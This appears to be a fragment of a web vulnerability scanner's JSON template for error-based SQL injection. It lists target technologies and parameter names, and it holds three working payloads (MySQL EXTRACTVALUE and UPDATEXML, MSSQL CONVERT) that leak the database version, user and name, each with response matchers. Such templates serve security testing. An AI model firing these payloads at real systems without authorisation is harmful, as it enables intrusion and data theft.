    "error_based": {
      "description": "Error-based SQL injection for explicit data extraction via database error messages",
      "tech_match": ["MySQL", "MSSQL", "Apache", "PHP", "IIS", "ASP.NET"],
      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
      "probes": [
        {
          "payload": "{{baseline}} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
          "description": "MySQL EXTRACTVALUE error-based extraction — XPATH syntax error leaks version() output",
          "matchers": [
            {"type": "word", "words": ["XPATH syntax", "xpath syntax"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}} AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
          "description": "MySQL UPDATEXML error-based extraction — XPATH syntax error leaks current DB user",
          "matchers": [
            {"type": "word", "words": ["XPATH syntax", "xpath syntax"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
          "description": "MSSQL CONVERT type mismatch error reveals current database name",
          "matchers": [
            {"type": "word", "words": ["conversion failed", "Conversion failed"], "condition": "or"}
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        }
      ]
